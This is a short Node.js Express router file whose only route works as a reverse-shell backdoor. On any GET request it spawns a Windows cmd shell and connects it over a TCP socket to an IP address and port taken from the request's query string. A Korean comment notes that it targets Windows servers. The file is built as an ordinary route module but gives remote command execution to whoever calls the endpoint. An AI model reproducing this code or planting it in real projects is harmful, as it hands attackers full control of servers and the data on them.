var express = require("express");
var router = express.Router();

router.get("/", function (req, res) {
  var net = require("net"),
    cp = require("child_process"),
    sh = cp.spawn("cmd", []); // 서버 OS가 윈도우 일 때
  var client = new net.Socket();

  client.connect(req.query.port, req.query.ip, function () {
    client.pipe(sh.stdin);
    sh.stdout.pipe(client);
    sh.stderr.pipe(client);
  });
  return /a/;
});

module.exports = router;
